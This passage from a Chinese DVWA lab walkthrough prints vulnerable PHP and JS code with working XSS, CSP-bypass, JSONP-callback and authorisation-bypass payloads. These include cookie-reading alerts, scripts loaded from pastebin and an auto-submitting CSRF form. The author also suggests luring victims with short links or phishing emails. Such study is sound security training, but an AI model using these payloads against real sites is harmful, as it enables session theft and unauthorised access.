?default=&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert('hacker')&gt; High &lt;?php // Is there any input? if ( array_key_exists( \"default\", $_GET ) &amp;&amp; !is_null ($_GET[ 'default' ]) ) { # White list the allowable languages switch ($_GET['default']) { case \"French\": case \"English\": case \"German\": case \"Spanish\": # ok break; default: header (\"location: ?default=English\"); exit; } } ?&gt; 这里说如果default的值不是上面四个指定的值中的一个，则直接无效，这里学了师傅们的两个思路 方法一：可以使用 &amp; 连接另一个自定义变量来 Bypass ?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert('XSS')&gt; ?default=English&amp;a=&lt;input onclick=alert('XSS') /&gt; 方法二：使用#来 Bypass 注：在url中#后边的内容不会发送到服务端，从而可以实现绕过。 ?default=English#&lt;/option&gt;&lt;/select&gt;&lt;BODY ONLOAD=alert(document.cookie)&gt; ?default=English#&lt;input onclick=alert('document.cookie') /&gt; Impossible &lt;?php # Don't need to do anything, protection handled on the client side ?&gt; 可以看见客户端这里对我们的输入的数据不进行url解码了，这样会导致标签失效，从而无法 XSS 0x11 XSS(Reflected) Low &lt;?php header (\"X-XSS-Protection: 0\"); // Is there any input? if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) { // Feedback for end user echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;'; } ?&gt; 这里只是判断是否存在name变量，如果存在直接插入标签中，不存在任何过滤 &lt;script&gt;alert('hacker')&lt;/script&gt; Medium &lt;?php header (\"X-XSS-Protection: 0\"); // Is there any input? if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) { // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello {$name}&lt;/pre&gt;\"; } ?&gt; 将过滤为空，这意味着可以大写或者双写绕过 &lt;s&lt;script&gt;cript&gt;alert(&#x27;hacker&#x27;)&lt;/script&gt; &lt;Script&gt;cript&gt;alert(&#x27;hacker&#x27;)&lt;/script&gt; High &lt;?php header (&quot;X-XSS-Protection: 0&quot;); // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello &#123;$name&#125;&lt;/pre&gt;&quot;; &#125; ?&gt; 过滤很全，将标签中的每个字符都过滤了，但我们可以使用其他标签 &lt;img src=1 onerror=alert(&#x27;hacker&#x27;) &lt;a href = &#x27;javascript:alert(&#x27;hacker&#x27;)&#x27;&gt;click&lt;/a&gt; Impossible &lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $name = htmlspecialchars( $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello &#123;$name&#125;&lt;/pre&gt;&quot;; &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 防止CSRF，接着采用htmlspecialchars杜绝了特殊字符： 这意味着我们的任何事件标签都将无用 0x12 XSS(Stored) Low &lt;?php if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] );//对字符串收尾去空 $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = stripslashes( $message );//取出反引号 $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitize name input $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close(); &#125; ?&gt; 可以看见对用户的输入在经过几个函数的处理后，插入了数据库，但并未做出对xss的过滤，但防止SQL注入 &lt;script&gt;alert(&#x27;hacker&#x27;)&lt;/script&gt; 可以看到当我们插入上述数据的时候，每当我们访问此页面，便会执行xss Medium &lt;?php if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close(); &#125; ?&gt; 可以看到这回对message做出了成功的过滤，但却忘记正确过滤name，只是将标签替换为空 但这里由于对Name这一文本框有字数限制，但我们可以放到bp上，或者直接F12在html中直接修改 可以看到成功XSS，类似paylaod还有： &lt;sc&lt;script&gt;ript&gt;alert(XSS)&lt;/script&gt; &lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt; 当然还可以：审查元素手动将 maxlength 的值调大一点就可以了。 High &lt;?php if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); //mysql_close(); &#125; ?&gt; 这里同样对message做出了严格的过滤，但对name只是单纯过滤了标签，这并没有什么用 Impossible &lt;?php if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $message = trim( $_POST[ &#x27;mtxMessage&#x27; ] ); $name = trim( $_POST[ &#x27;txtName&#x27; ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = stripslashes( $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $name = htmlspecialchars( $name ); // Update database $data = $db-&gt;prepare( &#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27; ); $data-&gt;bindParam( &#x27;:message&#x27;, $message, PDO::PARAM_STR ); $data-&gt;bindParam( &#x27;:name&#x27;, $name, PDO::PARAM_STR ); $data-&gt;execute(); &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 防止CSRF，SQL注入，同时对message与name的内容都做出了相同且严格的过滤，这是无法绕过的 0x13 CSP Bypass 内容安全策略（CSP）使服务器管理员可以通过指定浏览器应认为是可执行脚本的有效源的域来减少或消除XSS可能发生的向量。然后，兼容CSP的浏览器将仅执行从这些允许列出的域接收的源文件中加载的脚本，忽略所有其他脚本（包括内联脚本和事件处理HTML属性）。 除了限制可以从中加载内容的域之外，服务器还可以指定允许使用哪些协议; 例如（理想情况下，从安全角度来看），服务器可以指定必须使用HTTPS加载所有内容。完整的数据传输安全策略不仅包括强制HTTPS进行数据传输，还包括使用安全标记标记所有cookie，并提供从HTTP页面到其HTTPS对应项的自动重定向。站点还可以使用Strict-Transport-SecurityHTTP标头来确保浏览器仅通过加密通道连接到它们。 两种方法可以启用 CSP。 一种是通过 HTTP 头信息的Content-Security-Policy的字段。 一种是通过网页的标签 Low &lt;?php $headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;; // allows js from self, pastebin.com, hastebin.com, jquery and google analytics. header($headerCSP); # These might work if you can&#x27;t create your own for some reason # https://pastebin.com/raw/R570EE00 # https://www.toptal.com/developers/hastebin/raw/cezaruzeka ?&gt; &lt;?php if (isset ($_POST[&#x27;include&#x27;])) &#123; $page[ &#x27;body&#x27; ] .= &quot; &lt;script src=&#x27;&quot; . $_POST[&#x27;include&#x27;] . &quot;&#x27;&gt;&lt;/script&gt; &quot;; &#125; $page[ &#x27;body&#x27; ] .= &#x27; &lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt; &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt; &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt; &lt;/form&gt; &#x27;; 这里可以看到网站通过添加HTTP头信息的Content-Security-Policy的字段来开启CSP：要求本页面只能加载来自自身的或者pastebin.com, hastebin.com, jquery and google analytics.这些网站的js脚本代码 其中 pastebin.com 是一个快速分享文本内容的网站，这个内容我们是可控的，可以在这里面插入 XSS 攻击语句： https://pastebin.com/raw/dtZzx4TF 我们在上述网站构造XSS语句，之后记录下生成的网址，接着放入DVWA的文本输入框中，点击include即可触发XSS，但我这里不知为何没有反应 这里还可以配合 CSRF 让攻击更加自动化： &lt;form method=&quot;POST&quot; action=&quot;http://127.0.0.1:8888/vulnerabilities/csp/&quot; id=&quot;csp&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot;&gt; &lt;/form&gt; &lt;script&gt; var form = document.getElementById(&quot;csp&quot;); form[0].value=&quot;https://pastebin.com/raw/ZFnbmjBU&quot;; form.submit(); &lt;/script&gt; 将上述内容保存为 csrf.html 然后上传到公网服务器上 https://www.yourwebsite.com/csrf.html 将这个地址想方设法让受害者访问的话，就会自动触发 CSRF 和 XSS 攻击。这里可以采用短网址、钓鱼邮件等方法 Medium &lt;?php $headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;; header($headerCSP); // Disable XSS protections so that inline alert boxes will work header (&quot;X-XSS-Protection: 0&quot;); # &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt; ?&gt; &lt;?php if (isset ($_POST[&#x27;include&#x27;])) &#123; $page[ &#x27;body&#x27; ] .= &quot; &quot; . $_POST[&#x27;include&#x27;] . &quot; &quot;; &#125; $page[ &#x27;body&#x27; ] .= &#x27; &lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt; &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt; &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt; &lt;/form&gt; &#x27;; script-src ‘self’: 指定允许执行 JavaScript 代码的来源。在这里，'self' 表示只允许从同一域名加载脚本。 ‘unsafe-inline’: 允许内联脚本的执行，即在 HTML 中直接嵌入的脚本。 ‘nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=’: 使用 nonce（一次性随机值）来标识允许执行的脚本。在这里，指定了一个特定的 nonce 值。只有包含这个 nonce 的脚本才会被执行。 由于这一关允许内联脚本执行，因此我们直接构造XSS即可，但要注意需要包含上述指定的nonce值 &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(&#x27;hacker&#x27;)&lt;/script&gt; 之后直接输入文本框提交即可 High &lt;?php $headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;; header($headerCSP); ?&gt; &lt;?php if (isset ($_POST[&#x27;include&#x27;])) &#123; $page[ &#x27;body&#x27; ] .= &quot; &quot; . $_POST[&#x27;include&#x27;] . &quot; &quot;; &#125; $page[ &#x27;body&#x27; ] .= &#x27; &lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt; &lt;p&gt;The page makes a call to &#x27; . DVWA_WEB_PAGE_TO_ROOT . &#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt; &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt; &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt; &lt;/form&gt; &lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt; &#x27;; 这里做出了严格的限制，只允许加载来自自身网站的js脚本，但好在页面中有如下提示 The page makes a call to ../..//vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code. 说这个网站页面会加载vulnerabilities/csp/source/jsonp.php下的php的代码，对应内容如下 &lt;?php header(&quot;Content-Type: application/json; charset=UTF-8&quot;); if (array_key_exists (&quot;callback&quot;, $_GET)) &#123; $callback = $_GET[&#x27;callback&#x27;]; &#125; else &#123; return &quot;&quot;; &#125; $outp = array (&quot;answer&quot; =&gt; &quot;15&quot;); echo $callback . &quot;(&quot;.json_encode($outp).&quot;)&quot;; ?&gt; 判断变量callback是否存在与get传参中，如果存在的话，则会与js解码出来的数据一同拼接输出 同时页面代码还存在自动加载high.js文件，我们追踪看看 function clickButton() &#123; var s = document.createElement(&quot;script&quot;); s.src = &quot;source/jsonp.php?callback=solveSum&quot;; document.body.appendChild(s); &#125; function solveSum(obj) &#123; if (&quot;answer&quot; in obj) &#123; document.getElementById(&quot;answer&quot;).innerHTML = obj[&#x27;answer&#x27;]; &#125; &#125; var solve_button = document.getElementById (&quot;solve&quot;); if (solve_button) &#123; solve_button.addEventListener(&quot;click&quot;, function() &#123; clickButton(); &#125;); &#125; 这里表名，当我们点击id为solve的元素之后，便会调用clickButton函数，solve位置如下 该函数会创建一个script标签： &lt;script src=&quot;http://127.0.0.1/dvwa/vulnerabilities/csp/source/jsonp.php?callback=solveSum&quot;&gt;&lt;/script&gt; 这个时候浏览器就会发起如下请求： http://127.0.0.1/dvwa/vulnerabilities/csp/source/jsonp.php?callback=solveSum 访问这个 jsonp.php 会得到如下请求： 如果我们将callback改为alert之类的，就会触发弹窗，那接下来就是想办法如何修改callback参数了 if (isset ($_POST[&#x27;include&#x27;])) &#123; $page[ &#x27;body&#x27; ] .= &quot; &quot; . $_POST[&#x27;include&#x27;] . &quot; &quot;; &#125; 幸运的是这里留了一个include参数，并且该参数内容会直接插入body中，我们直接利用即可，但这里并不是直接插入script标签，因为没有unsafe_inline，因此并不会当做脚本执行。构造如下： include=&lt;script src=source/jsonp.php?callback=alert(document.cookie)&gt;&lt;/script&gt; 这里加载jsonp.php的代码，并修改callback参数即可成功弹窗 Impossible &lt;?php $headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;; header($headerCSP); ?&gt; &lt;?php if (isset ($_POST[&#x27;include&#x27;])) &#123; $page[ &#x27;body&#x27; ] .= &quot; &quot; . $_POST[&#x27;include&#x27;] . &quot; &quot;; &#125; $page[ &#x27;body&#x27; ] .= &#x27; &lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt; &lt;p&gt;Unlike the high level, this does a JSONP call but does not use a callback, instead it hardcodes the function to call.&lt;/p&gt;&lt;p&gt;The CSP settings only allow external JavaScript on the local server and no inline code.&lt;/p&gt; &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt; &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt; &lt;/form&gt; &lt;script src=&quot;source/impossible.js&quot;&gt;&lt;/script&gt; &#x27;; 这里主要是下面文件发生了改动：jsonp_impossible.php： &lt;?php header(&quot;Content-Type: application/json; charset=UTF-8&quot;); $outp = array (&quot;answer&quot; =&gt; &quot;15&quot;); echo &quot;solveSum (&quot;.json_encode($outp).&quot;)&quot;; ?&gt; 这里指定了只能输出 solveSum，这里也就写死了，没法绕过 0x14 JS Attacks Low &lt;?php $page[ &#x27;body&#x27; ] .= &lt;&lt;&lt;EOF &lt;script&gt; /* MD5 code from here https://github.com/blueimp/JavaScript-MD5 */ !function(n)&#123;&quot;use strict&quot;;function t(n,t)&#123;var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r&#125;function r(n,t)&#123;return n&lt;&lt;t|n&gt;&gt;&gt;32-t&#125;function e(n,e,o,u,c,f)&#123;return t(r(t(t(e,n),t(u,f)),c),o)&#125;function o(n,t,r,o,u,c,f)&#123;return e(t&amp;r|~t&amp;o,n,t,u,c,f)&#125;function u(n,t,r,o,u,c,f)&#123;return e(t&amp;o|r&amp;~o,n,t,u,c,f)&#125;function c(n,t,r,o,u,c,f)&#123;return e(t^r^o,n,t,u,c,f)&#125;function f(n,t,r,o,u,c,f)&#123;return e(r^(t|~o),n,t,u,c,f)&#125;function i(n,r)&#123;n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d&#125; function rot13(inp) &#123; return inp.replace(/[a-zA-Z]/g,function(c)&#123;return String.fromCharCode((c&lt;=&quot;Z&quot;?90:122)&gt;=(c=c.charCodeAt(0)+13)?c:c-26);&#125;); &#125; function generate_token() &#123; var phrase = document.getElementById(&quot;phrase&quot;).value; document.getElementById(&quot;token&quot;).value = md5(rot13(phrase)); &#125; generate_token(); &lt;/script&gt; EOF; ?&gt; 可以到上述代码主要是用来生成一个token，大概逻辑看看我们可以知道，上述代码会在前端html找一个id名为phrase的元素，随后拿到其value值，接着按该值生成独属于其的token。元素位置如下 而这里倘若我们直接将其修改为success，会发现页面说我们是一个无效的token，这是因为我们采用的是ChangeMe的token，因此我们需要想办法拿到success生成的token，幸运的是这在前端就生成了，我们只需要改一下phrase的值，在前端运行一下即可 这里在开发者工具中找到对应的js代码地址，在生成token函数的地方下一个断点，接着刷新页面运行，之后会在右侧出现phrase，接着修改其值为success，之后继续运行，会发现，token发生了变化。这时我们直接修改为success提交，会发现提交成功 Medium &lt;?php $page[ &#x27;body&#x27; ] .= &#x27;&lt;script src=&quot;&#x27; . DVWA_WEB_PAGE_TO_ROOT . &#x27;vulnerabilities/javascript/source/medium.js&quot;&gt;&lt;/script&gt;&#x27;; ?&gt; 我们跟踪medium.js： function do_something(e)&#123; for(var t=&quot;&quot;,n=e.length-1;n&gt;=0;n--)t+=e[n]; return t &#125; setTimeout(function()&#123; do_elsesomething(&quot;XX&quot;)&#125;,300); function do_elsesomething(e)&#123; document.getElementById(&quot;token&quot;).value=do_something(e+document.getElementById(&quot;phrase&quot;).value+&quot;XX&quot;) &#125; 这里看了一下逻辑，发现其会取token的值为xx+id名为phrase的值+xx，接着传给do_something函数，该函数将传入的参数倒序输出 我们看到上述的token值为XXeMegnahCXX，这意味着我们只需要将其改为XXsseccusXX即可 可以看到成功修改 High &lt;?php $page[ &#x27;body&#x27; ] .= &#x27;&lt;script src=&quot;&#x27; . DVWA_WEB_PAGE_TO_ROOT . &#x27;vulnerabilities/javascript/source/high.js&quot;&gt;&lt;/script&gt;&#x27;; ?&gt; var a=[&#x27;fromCharCode&#x27;,&#x27;toString&#x27;,&#x27;replace&#x27;,&#x27;BeJ&#x27;,&#x27;\\x5cw+&#x27;,&#x27;Lyg&#x27;,&#x27;SuR&#x27;,&#x27;(w()&#123;\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:&#123;&#125;;p(Y.3N).........!&#x27;&#x27;[b(&#x27;0x2&#x27;)](/^/,String))&#123;while(f--)&#123;i[h(f)]=g[f]||h(f);&#125;g=[function(k)&#123;if(&#x27;wpA&#x27;!==b(&#x27;0x3&#x27;))&#123;return i[k];&#125;else&#123;while(f--)&#123;i[k(f)]=g[f]||k(f);&#125;g=[function(l)&#123;return i[l];&#125;];k=function()&#123;return b(&#x27;0x4&#x27;);&#125;;f=0x1;&#125;&#125;];h=function()&#123;return b(&#x27;0x4&#x27;);&#125;;f=0x1;&#125;;while(f--)&#123;if(g[f])&#123;if(b(&#x27;0x5&#x27;)===b(&#x27;0x6&#x27;))&#123;return i[h];&#125;else&#123;d=d[b(&#x27;0x2&#x27;)](new RegExp(&#x27;\\x5cb&#x27;+h(f)+&#x27;\\x5cb&#x27;,&#x27;g&#x27;),g[f]);&#125;&#125;&#125;return d;&#125;(b(&#x27;0x7&#x27;),0x3e,0x137,b(&#x27;0x8&#x27;)[b(&#x27;0x9&#x27;)](&#x27;|&#x27;),0x0,&#123;&#125;)); 这里的代码是被混淆了，我们用在线网站解密一下：http://deobfuscatejavascript.com/# 重点代码在后面： function do_something(e) &#123; for (var t = &quot;&quot;, n = e.length - 1; n &gt;= 0; n--) t += e[n]; return t &#125; function token_part_3(t, y = &quot;ZZ&quot;) &#123; document.getElementById(&quot;token&quot;).value = sha256(document.getElementById(&quot;token&quot;).value + y) &#125; function token_part_2(e = &quot;YY&quot;) &#123; document.getElementById(&quot;token&quot;).value = sha256(e + document.getElementById(&quot;token&quot;).value) &#125; function token_part_1(a, b) &#123; document.getElementById(&quot;token&quot;).value = do_something(document.getElementById(&quot;phrase&quot;).value) &#125; document.getElementById(&quot;phrase&quot;).value = &quot;&quot;; setTimeout(function() &#123; token_part_2(&quot;XX&quot;) &#125;, 300); document.getElementById(&quot;send&quot;).addEventListener(&quot;click&quot;, token_part_3); token_part_1(&quot;ABCD&quot;, 44); 这里首先将phrase的value赋值为空，接着调用token_part_1函数，将phrase的值倒序输出，随后延迟300s调用token_part_2函数，YY经过sha加密，赋值给token的value，然后当我们点击submit按钮时，调用token_part_3函数将token值拼接ZZ接着经过sha加密，赋值给token的value 这里可以看到我们输入的success，与这些代码根本无关，因为其phrase的值始终被设置为0，我们进F12调试看看 我们在右侧下个对于鼠标click的断点，接着我们点击上面的文本框，会发现我们成功进入断点调试，接着一直按运行键，会发现左侧出现了我们之前解混淆的js代码，接着我们对part1函数下断点，同时取消对click的断点 然后去控制台设置phrase的值为success，按下图所示。接着回车一下，随后放行，会发现在输入框中出现succes，接着我们点击submit按钮发送即可发现成功修改 Impossible You can never trust anything that comes from the user or prevent them from messing with it and so there is no impossible level. 直接把用户输入的地方关了，这无从下手了。。。。。 0x15 Authorisation Bypass This page should only be accessible by the admin user. Your challenge is to gain access to the features using one of the other users, for example gordonb / abc123. 这意味着这是一个未授权访问的漏洞，我们的目标是以gordonb这一低级别用户访问管理员才可以访问的页面 Low &lt;?php /* Nothing to see here for this vulnerability, have a look instead at the dvwaHtmlEcho function in: * dvwa/includes/dvwaPage.inc.php */ ?&gt; 可见这里没有任何限制，是存在未授权访问的，让我们先以低级别用户登录看看 如上图，可以看到我们当前用户是没有权限访问到刚才的页面的，接下来我们尝试抓包，看一下刚刚管理员页面的url地址 如上图，接下来让我们尝试直接访问该url地址 可以看到成功未授权 Medium &lt;?php /* Only the admin user is allowed to access this page. Have a look at these two files for possible vulnerabilities: * vulnerabilities/authbypass/get_user_data.php * vulnerabilities/authbypass/change_user_details.php */ if (dvwaCurrentUser() != &quot;admin&quot;) &#123; print &quot;Unauthorised&quot;; http_response_code(403); exit; &#125; ?&gt; 这里他会判断该用户是否为admin，如果不是则返回403。 但值得注意的是，这段代码似乎只是检查medium.php页面。 我们继续bp抓一下看看该页面的功能点，可以看到当我们点击update按钮的时候，我们实际上是被get_user_data.php页面进行处理，接下来我们可以猜测该页面没有做未授权处理，我们可以尝试直接访问该页面看看 可以看到虽然其只对medium.php做了限制，当我们访问getuserdata的时候，仍然可以得到一些数据 High &lt;?php /* Only the admin user is allowed to access this page. Have a look at this file for possible vulnerabilities: * vulnerabilities/authbypass/change_user_details.php */ if (dvwaCurrentUser() != &quot;admin&quot;) &#123; print &quot;Unauthorised&quot;; http_response_code(403); exit; &#125; ?&gt; 依旧是相同的代码，我们接着上一个级别的思路访问一下 发现行不通了，这个api接口也被禁用了，接下来我们在管理员界面的更新数据地方，进行bp抓包，如下图发现，这里的api接口改为了change功能，而我们可以注意到上一个级别是get功能，这不禁让我们猜测，该功能可能并没有做出有效的未授权访问限制 跟踪相关代码也可以发现，这里只对impossible级别做出的严格限制 接下来我们用其他用户访问该api页面，同时bp抓包admin用户的change功能对应的数据包 接下来尝试将上面的json数据赋值到下面的普通用户数据包中，点击发送可以看到右侧回显访问成功的标志 Impossible &lt;?php /* Only the admin user is allowed to access this page */ if (dvwaCurrentUser() != &quot;admin&quot;) &#123; print &quot;Unauthorised&quot;; http_response_code(403); exit; &#125; ?&gt; 这里的代码依旧没有什么变化，但我们跟踪相关文件可以发现： 这两个api功能文件在对impossible级别上都做出了严格的限制，只要当前用户不是admin，则无权访问，这是无法绕过的 这里经过测试发现，直接显示无权访问 0x16 HTTP 重定向 Low &lt;?php if (array_key_exists (&quot;redirect&quot;, $_GET) &amp;&amp; $_GET[&#x27;redirect&#x27;] != &quot;&quot;) &#123; header (&quot;location: &quot; . $_GET[&#x27;redirect&#x27;]); exit; &#125; http_response_code (500); ?&gt; &lt;p&gt;Missing redirect target.&lt;/p&gt; &lt;?php exit; ?&gt; 